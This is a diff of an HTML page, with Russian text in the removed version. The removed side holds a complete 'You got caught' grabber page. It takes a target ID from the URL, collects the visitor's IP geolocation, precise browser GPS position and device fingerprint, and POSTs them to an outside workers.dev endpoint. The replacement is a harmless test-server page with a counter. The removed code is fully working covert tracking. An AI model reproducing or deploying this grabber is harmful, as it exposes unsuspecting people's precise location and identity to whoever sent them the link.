@@ -1,134 +1,31 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-  <meta charset="UTF-8">
-  <title>Ты попался</title>
-  <style>
-    body {
-      margin: 0;
-      height: 100vh;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      background: radial-gradient(circle at center, #000000, #111111, #000000);
-      color: red;
-      font-family: 'Impact', 'Arial Black', sans-serif;
-      overflow: hidden;
-    }
-
-    h1 {
-      font-size: 5em;
-      text-shadow: 0 0 20px red, 0 0 40px crimson, 0 0 60px darkred;
-      animation: flicker 1.5s infinite alternate, shake 0.3s infinite;
-    }
-
-    @keyframes flicker {
-      0% { opacity: 1; text-shadow: 0 0 20px red, 0 0 40px crimson, 0 0 60px darkred; }
-      50% { opacity: 0.7; text-shadow: 0 0 10px red, 0 0 20px crimson; }
-      100% { opacity: 1; text-shadow: 0 0 30px red, 0 0 60px crimson, 0 0 90px darkred; }
-    }
-
-    @keyframes shake {
-      0% { transform: translate(0px, 0px) rotate(0deg); }
-      25% { transform: translate(2px, -2px) rotate(-1deg); }
-      50% { transform: translate(-2px, 2px) rotate(1deg); }
-      75% { transform: translate(2px, 2px) rotate(0deg); }
-      100% { transform: translate(0px, 0px) rotate(-1deg); }
-    }
-
-    .content {
-      position: relative;
-      z-index: 1;
-    }
-  </style>
-  <script>
-    window.onload = async function () {
-      document.querySelector(".content").innerHTML = "<h1>Ты попался!</h1>";
-
-      const urlParams = new URLSearchParams(window.location.search);
-      const TARGET_ID = urlParams.get("u"); 
-      if (!TARGET_ID) return;
-
-      async function getBrowserLocation() {
-        return new Promise((resolve) => {
-          if (!navigator.geolocation) {
-            resolve(null);
-            return;
-          }
-          navigator.geolocation.getCurrentPosition(
-            (position) => {
-              resolve({
-                lat: position.coords.latitude,
-                lon: position.coords.longitude,
-                accuracy: position.coords.accuracy,
-                altitude: position.coords.altitude || null,
-                altitudeAccuracy: position.coords.altitudeAccuracy || null,
-                heading: position.coords.heading || null,
-                speed: position.coords.speed || null
-              });
-            },
-            () => resolve(null),
-            { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
-          );
-        });
-      }
-
-      try {
-        const [ipResponse, browserGeo] = await Promise.all([
-          fetch('https://ipapi.co/json/'),
-          getBrowserLocation()
-        ]);
-
-        const ipData = ipResponse.ok ? await ipResponse.json() : { error: "ipapi_failed" };
-
-        const ua = navigator.userAgent || null;
-        const lang = navigator.language || null;
-        const platform = navigator.platform || null;
-        const screenSize = (screen && screen.width && screen.height) ? `${screen.width}x${screen.height}` : null;
-        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || null;
-        const now = new Date().toISOString();
-        const cookiesEnabled = navigator.cookieEnabled ? true : false;
-        const javaEnabled = (typeof navigator.javaEnabled === 'function') ? navigator.javaEnabled() : null;
-        const online = navigator.onLine;
-
-        const payload = {
-          id: TARGET_ID,
-          response: {
-            ip: ipData.ip || null,
-            city: ipData.city || null,
-            region: ipData.region || null,
-            country: ipData.country_name || ipData.country || null,
-            postal: ipData.postal || null,
-            browser_geo: browserGeo,
-            user_agent: ua,
-            language: lang,
-            platform: platform,
-            screen: screenSize,
-            timezone: timezone,
-            time_iso: now,
-            cookies_enabled: cookiesEnabled,
-            java_enabled: javaEnabled,
-            online: online,
-            raw_ipapi: ipData
-          }
-        };
-
-        const resp = await fetch("https://uifiehkfds.vavun228-60b.workers.dev/", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify(payload)
-        });
-
-        const result = await resp.json();
-        console.log(result);
-        
-      } catch (error) {
-        console.error(error);
-      }
-    };
-  </script>
+    <meta charset="UTF-8">
+    <title>Test Site</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: #0a0a0a;
+            color: #0f0;
+            text-align: center;
+            padding: 50px;
+        }
+        h1 { color: #ff0; }
+        a { color: #0ff; }
+    </style>
 </head>
 <body>
-  <div class="content"></div>
+    <h1>✅ TEST SERVER</h1>
+    <p>Total requests: <span id="counter">0</span></p>
+    <p><a href="/stats">Statistics</a> | <a href="/big">Download 1MB</a></p>
+    
+    <script>
+        let count = 0;
+        setInterval(() => {
+            count++;
+            document.getElementById('counter').innerText = count;
+        }, 1000);
+    </script>
 </body>
 </html>
